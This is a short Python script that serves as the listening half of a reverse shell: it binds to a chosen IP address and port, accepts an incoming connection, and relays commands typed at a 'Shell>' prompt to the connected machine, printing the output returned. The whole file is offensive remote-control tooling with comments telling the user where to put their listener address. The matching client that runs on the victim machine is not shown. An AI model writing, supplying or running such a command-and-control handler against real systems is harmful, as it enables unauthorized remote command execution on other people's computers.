import socket

def connect():

    s = socket.socket()
    s.bind(("192.0.0.1", 1000))# your ip address and port you want to listen on
    s.listen(1) # how many connections you want
    conn, addr = s.accept() #returns IP address of client
    print ('[+] We got a connection from', addr)

    while True:

        command = input("Shell> ")

        if 'terminate' in command:
            conn.send('terminate'.encode())
            conn.close()
            break

        else:
            conn.send(command.encode())
            print( conn.recv(1024).decode())

def main():
    connect()
main()
